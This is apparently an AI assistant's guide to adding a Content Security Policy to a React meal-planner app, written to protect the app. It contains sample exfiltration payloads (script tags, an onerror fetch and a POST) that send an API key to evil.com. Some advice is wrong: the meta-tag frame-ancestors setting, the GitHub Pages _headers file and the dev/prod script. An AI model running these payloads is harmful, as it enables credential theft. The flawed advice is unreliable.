# Content Security Policy (CSP) - Detailed Guide

## What is Content Security Policy?

Content Security Policy (CSP) is a **browser security feature** that acts as a whitelist, telling the browser which sources of content are allowed to load and execute on your page.

Think of it as a **bouncer at a nightclub** - it controls what scripts, styles, images, and other resources are allowed to enter your web page.

---

## Why Do You Need CSP?

### The Problem: XSS Even When You Code Safely

Even though your React code is safe, CSP protects against scenarios where:

1. **Your hosting gets compromised**
   - Attacker injects `<script src="evil.com/steal.js"></script>` into your HTML
   - Without CSP: Evil script runs, steals API keys from localStorage
   - With CSP: Browser **blocks** the external script, logs error in console

2. **Browser extension gone rogue**
   - Malicious extension tries to inject tracking scripts
   - Without CSP: Extension can read everything, modify your page
   - With CSP: Browser blocks unauthorized scripts

3. **Supply chain attack**
   - One of your npm dependencies gets compromised
   - Attacker adds code to load external resources
   - Without CSP: External resources load silently
   - With CSP: Browser blocks it, you see warnings

4. **CDN compromise**
   - If you loaded libraries from a CDN that gets hacked
   - Without CSP: Malicious code executes
   - With CSP: Only whitelisted sources allowed

---

## How CSP Works

### The Basic Idea

You add a special header or meta tag that tells the browser:
```
"Only execute scripts from MY domain. Block everything else."
```

The browser enforces this **before** any malicious code can run.

### CSP Directives Explained

Each directive controls a different type of content:

| Directive | What It Controls | Example |
|-----------|------------------|---------|
| `default-src` | Fallback for all other directives | `default-src 'self'` = "Only load from my domain by default" |
| `script-src` | JavaScript files and inline scripts | `script-src 'self'` = "Only run scripts from my domain" |
| `style-src` | CSS files and inline styles | `style-src 'self' 'unsafe-inline'` = "My domain + inline CSS" |
| `connect-src` | AJAX, WebSocket, fetch() calls | `connect-src 'self' https://api.anthropic.com` |
| `img-src` | Images | `img-src 'self' data:` = "My domain + data URLs" |
| `font-src` | Fonts | `font-src 'self'` |
| `object-src` | Flash, Java applets, etc. | `object-src 'none'` = "Block all plugins" |
| `base-uri` | <base> tag URLs | `base-uri 'self'` = "Prevent base tag hijacking" |
| `form-action` | Form submission targets | `form-action 'self'` = "Only submit forms to my domain" |

### Special Keywords

- **`'self'`** = Your own domain (e.g., `meal-planner.com`)
- **`'none'`** = Block everything (don't load this type at all)
- **`'unsafe-inline'`** = Allow inline `<script>` and `<style>` tags (less secure, but needed for some apps)
- **`'unsafe-eval'`** = Allow `eval()` and `new Function()` (dangerous, avoid!)
- **`data:`** = Allow data URLs (e.g., `data:image/png;base64,...`)
- **`https:`** = Allow any HTTPS URL (too permissive, avoid)

---

## Your App's CSP Needs

### What Your App Currently Does

Let me analyze your app's resource loading:

1. **JavaScript**:
   - ✅ All JS is bundled by Vite into your own domain
   - ✅ No external script tags
   - ✅ No CDN dependencies

2. **Styles**:
   - ✅ CSS Modules compiled by Vite
   - ⚠️ Uses inline styles via React's `style` prop
   - Need: `'unsafe-inline'` for inline styles

3. **API Calls**:
   - ✅ Only calls `https://api.anthropic.com`
   - Need: Allow this specific domain

4. **Images**:
   - ✅ No external images currently
   - Future: Might use emoji or icons
   - Need: `'self'` and `data:` (for base64 emojis)

5. **Fonts**:
   - ✅ System fonts only (no web fonts)
   - Need: `'self'` or `'none'`

6. **WebSockets/EventSource**:
   - ❌ Not used
   - Need: Block with `'self'`

---

## Recommended CSP for Your App

### Option 1: Strict CSP (Most Secure)

```html
<meta http-equiv="Content-Security-Policy" content="
  default-src 'self';
  script-src 'self';
  style-src 'self' 'unsafe-inline';
  connect-src 'self' https://api.anthropic.com;
  img-src 'self' data:;
  font-src 'self';
  object-src 'none';
  base-uri 'self';
  form-action 'self';
  frame-ancestors 'none';
">
```

**Breakdown**:
- `default-src 'self'` - Everything from your domain by default
- `script-src 'self'` - Only your bundled JS (blocks all external scripts)
- `style-src 'self' 'unsafe-inline'` - Your CSS + React inline styles
- `connect-src 'self' https://api.anthropic.com` - Only your domain + Claude API
- `img-src 'self' data:` - Your images + data URLs
- `font-src 'self'` - Your fonts only
- `object-src 'none'` - Block Flash, Java, etc.
- `base-uri 'self'` - Prevent <base> tag attacks
- `form-action 'self'` - Forms only submit to your domain
- `frame-ancestors 'none'` - Prevent clickjacking (can't be iframed)

### Option 2: Report-Only Mode (Testing)

Start with CSP in **report-only mode** to see what would be blocked without actually blocking it:

```html
<meta http-equiv="Content-Security-Policy-Report-Only" content="
  default-src 'self';
  script-src 'self';
  style-src 'self' 'unsafe-inline';
  connect-src 'self' https://api.anthropic.com;
  img-src 'self' data:;
  font-src 'self';
  object-src 'none';
  base-uri 'self';
  form-action 'self';
  frame-ancestors 'none';
  report-uri /csp-violation-report;
">
```

**How to use**:
1. Add this to your HTML
2. Browse your app normally
3. Open DevTools Console
4. Look for CSP violation warnings
5. Adjust policy as needed
6. Switch to enforcing mode

---

## How to Implement CSP

### Method 1: Meta Tag in HTML (Easiest)

**File**: `index.html`

Find the `<head>` section and add:

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <link rel="icon" type="image/svg+xml" href="/vite.svg" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />

    <!-- ADD CSP HERE -->
    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; connect-src 'self' https://api.anthropic.com; img-src 'self' data:; font-src 'self'; object-src 'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'none';">

    <title>Meal Planner</title>
  </head>
  <body>
    <div id="root"></div>
    <script type="module" src="/src/main.jsx"></script>
  </body>
</html>
```

### Method 2: HTTP Header (More Secure, Requires Server)

If you're hosting on a server (not just GitHub Pages), configure the server to send CSP headers.

**Netlify** (`netlify.toml`):
```toml
[[headers]]
  for = "/*"
  [headers.values]
    Content-Security-Policy = "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; connect-src 'self' https://api.anthropic.com; img-src 'self' data:; font-src 'self'; object-src 'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'none'"
```

**Vercel** (`vercel.json`):
```json
{
  "headers": [
    {
      "source": "/(.*)",
      "headers": [
        {
          "key": "Content-Security-Policy",
          "value": "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; connect-src 'self' https://api.anthropic.com; img-src 'self' data:; font-src 'self'; object-src 'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'none'"
        }
      ]
    }
  ]
}
```

**GitHub Pages** (`_headers` file in `public/`):
```
/*
  Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; connect-src 'self' https://api.anthropic.com; img-src 'self' data:; font-src 'self'; object-src 'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'none'
```

---

## Testing Your CSP

### Step 1: Add CSP in Report-Only Mode

```html
<meta http-equiv="Content-Security-Policy-Report-Only" content="...">
```

### Step 2: Open DevTools Console

Chrome/Edge: `F12` or `Cmd+Option+I`

### Step 3: Use Your App Normally

- Navigate all pages
- Enter API key
- Generate meals
- View history
- Edit settings

### Step 4: Look for Violations

You'll see messages like:
```
[Report Only] Refused to load the script 'https://evil.com/script.js'
because it violates the following CSP directive: "script-src 'self'"
```

### Step 5: Adjust Policy

If you see legitimate violations (e.g., a library you need):
- Add the domain to the appropriate directive
- Example: Need Google Fonts? Add to `font-src`:
  ```
  font-src 'self' https://fonts.gstatic.com
  ```

### Step 6: Switch to Enforcing Mode

Once no violations occur, change:
```html
Content-Security-Policy-Report-Only  →  Content-Security-Policy
```

---

## Common CSP Issues & Fixes

### Issue 1: "Refused to execute inline script"

**Error**:
```
Refused to execute inline script because it violates CSP directive "script-src 'self'"
```

**Cause**: You have `<script>alert('test')</script>` in your HTML

**Fix**:
- Option A: Move script to external file
- Option B: Add `'unsafe-inline'` to `script-src` (less secure)

**Your app**: ✅ No inline scripts, you're good!

---

### Issue 2: "Refused to apply inline style"

**Error**:
```
Refused to apply inline style because it violates CSP directive "style-src 'self'"
```

**Cause**: React's `style={{color: 'red'}}`

**Fix**: Add `'unsafe-inline'` to `style-src`

**Your app**: ⚠️ You use inline styles, so you need `'unsafe-inline'`

---

### Issue 3: "Refused to connect to..."

**Error**:
```
Refused to connect to 'https://api.anthropic.com' because it violates CSP
```

**Cause**: API call blocked

**Fix**: Add domain to `connect-src`
```
connect-src 'self' https://api.anthropic.com
```

**Your app**: ✅ Already included in recommendation

---

### Issue 4: Vite Dev Server Issues

**Problem**: CSP blocks Vite's HMR (Hot Module Replacement) in development

**Error**:
```
Refused to connect to 'ws://localhost:5173'
```

**Fix**: Use different CSP for dev vs production

**Option A**: Conditional CSP in `index.html`
```html
<script>
  if (import.meta.env.DEV) {
    // Development - relaxed CSP
    document.head.innerHTML += '<meta http-equiv="Content-Security-Policy" content="default-src * \'unsafe-inline\' \'unsafe-eval\' data: blob:;">';
  } else {
    // Production - strict CSP
    document.head.innerHTML += '<meta http-equiv="Content-Security-Policy" content="default-src \'self\'; script-src \'self\'; ...">';
  }
</script>
```

**Option B**: Only add CSP in production build

Don't add `<meta>` tag to `index.html` at all. Instead, configure your hosting provider (Netlify, Vercel) to inject the header only in production.

**Option C**: Allow localhost in dev
```html
<meta http-equiv="Content-Security-Policy" content="
  default-src 'self';
  script-src 'self';
  connect-src 'self' https://api.anthropic.com ws://localhost:* http://localhost:*;
">
```

---

## What Attacks Does CSP Prevent?

### Attack 1: Injected Script Tag ✅ BLOCKED

**Scenario**: Attacker compromises your hosting, injects:
```html
<script src="https://evil.com/keylogger.js"></script>
```

**Without CSP**:
- Script loads and executes
- Steals API key from localStorage
- Sends to attacker's server

**With CSP `script-src 'self'`**:
- Browser refuses to load the script
- Console shows: "Refused to load script from 'https://evil.com'..."
- API key stays safe ✅

---

### Attack 2: Inline Script Injection ✅ BLOCKED (if you don't use unsafe-inline)

**Scenario**: XSS vulnerability injects:
```html
<img src=x onerror="fetch('https://evil.com?key='+localStorage.getItem('apiKey'))">
```

**Without CSP**:
- Image fails to load
- onerror handler executes
- API key stolen

**With CSP `script-src 'self'` (no unsafe-inline)**:
- Browser refuses to execute inline event handler
- onerror code never runs ✅

**Your app**: ⚠️ React doesn't create inline event handlers, but you use inline styles, so this is partially protected

---

### Attack 3: Data Exfiltration ✅ BLOCKED

**Scenario**: Malicious code tries to send data to attacker:
```javascript
fetch('https://evil.com/steal', {
  method: 'POST',
  body: JSON.stringify({
    apiKey: localStorage.getItem('apiKey')
  })
});
```

**Without CSP**:
- Data sent to evil.com
- Attacker receives API key

**With CSP `connect-src 'self' https://api.anthropic.com`**:
- Browser blocks the fetch request
- Console error: "Refused to connect to 'https://evil.com'..."
- Data stays safe ✅

---

### Attack 4: Clickjacking ✅ BLOCKED

**Scenario**: Attacker embeds your site in an invisible iframe:
```html
<iframe src="https://your-meal-planner.com" style="opacity: 0">
</iframe>
<button style="position: absolute">Click for free pizza!</button>
```

User thinks they're clicking "free pizza" but actually clicking your "Delete All Data" button.

**Without CSP**:
- Your site loads in iframe
- User tricked into dangerous actions

**With CSP `frame-ancestors 'none'`**:
- Browser refuses to load your site in iframe
- Attack fails ✅

---

## CSP Gotchas for Your App

### ⚠️ Inline Styles Weaken CSP

Your React code uses inline styles:
```jsx
<div style={{ color: C.text, background: C.bg }}>
```

This requires `style-src 'unsafe-inline'`, which means CSP **cannot** block this attack:
```html
<div style="position:absolute; top:0; left:0; width:100vw; height:100vh; background:url('https://evil.com/log?data=...')">
```

**Severity**: Low - attacker would need XSS vulnerability first (which you don't have)

**Mitigation**: Use CSS Modules only (no inline styles). But this requires refactoring your entire app.

**Recommendation**: Accept this tradeoff. The benefits of CSP still outweigh this limitation.

---

### ✅ No eval() Used

CSP would block `eval()` and `new Function()`, but you don't use these. Good!

---

### ✅ No Third-Party Scripts

You don't load analytics, ads, or tracking scripts. This makes CSP much simpler!

If you add Google Analytics later, you'd need:
```
script-src 'self' https://www.googletagmanager.com
```

---

## Advanced: CSP with Nonces (Most Secure)

Instead of `'unsafe-inline'`, you can use **nonces** (random tokens):

### How Nonces Work

1. Server generates random nonce: `nonce-abc123xyz`
2. Server adds to CSP header: `style-src 'self' 'nonce-abc123xyz'`
3. Server adds nonce to allowed inline styles:
   ```html
   <style nonce="abc123xyz">
     .button { color: red; }
   </style>
   ```
4. Browser only executes styles with matching nonce

**Problem for your app**:
- Requires server-side rendering
- Your app is client-side only (Vite SPA)
- Nonces don't work with React's inline styles

**Recommendation**: Stick with `'unsafe-inline'` for now

---

## Monitoring CSP Violations

### Option 1: Browser Console (Development)

Open DevTools, CSP violations show as errors:
```
[Error] Refused to load the script 'https://evil.com/bad.js'
because it violates the following CSP directive: "script-src 'self'"
```

### Option 2: Report-URI (Production)

CSP can send violation reports to a server:
```html
<meta http-equiv="Content-Security-Policy" content="
  default-src 'self';
  ...
  report-uri https://your-domain.com/csp-report;
">
```

When a violation occurs, browser sends POST request:
```json
{
  "csp-report": {
    "document-uri": "https://your-meal-planner.com/",
    "violated-directive": "script-src",
    "blocked-uri": "https://evil.com/bad.js",
    "source-file": "https://your-meal-planner.com/",
    "line-number": 42
  }
}
```

**Services that collect CSP reports**:
- [report-uri.com](https://report-uri.com/) (free tier)
- Sentry (if you're already using it)
- Your own endpoint

---

## Summary & Recommendation

### For Your App:

**Start with this CSP** (add to `index.html`):

```html
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; connect-src 'self' https://api.anthropic.com; img-src 'self' data:; font-src 'self'; object-src 'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'none';">
```

**Formatted for readability**:
```html
<meta http-equiv="Content-Security-Policy" content="
  default-src 'self';
  script-src 'self';
  style-src 'self' 'unsafe-inline';
  connect-src 'self' https://api.anthropic.com;
  img-src 'self' data:;
  font-src 'self';
  object-src 'none';
  base-uri 'self';
  form-action 'self';
  frame-ancestors 'none';
">
```

### Benefits You Get:

✅ Blocks external scripts from loading
✅ Blocks data exfiltration to unknown domains
✅ Prevents your site from being iframed (clickjacking)
✅ Prevents base tag attacks
✅ Browser warns you if something suspicious happens

### Tradeoffs:

⚠️ Needs `'unsafe-inline'` for React styles (acceptable)
⚠️ Might need adjustment if you add third-party services later

---

## Next Steps

1. **Test in development first** with `Content-Security-Policy-Report-Only`
2. **Check console for violations** while using the app
3. **Adjust policy if needed**
4. **Switch to enforcing mode** when ready
5. **Monitor violations in production** (optional)

Would you like me to implement this CSP in your `index.html` now?
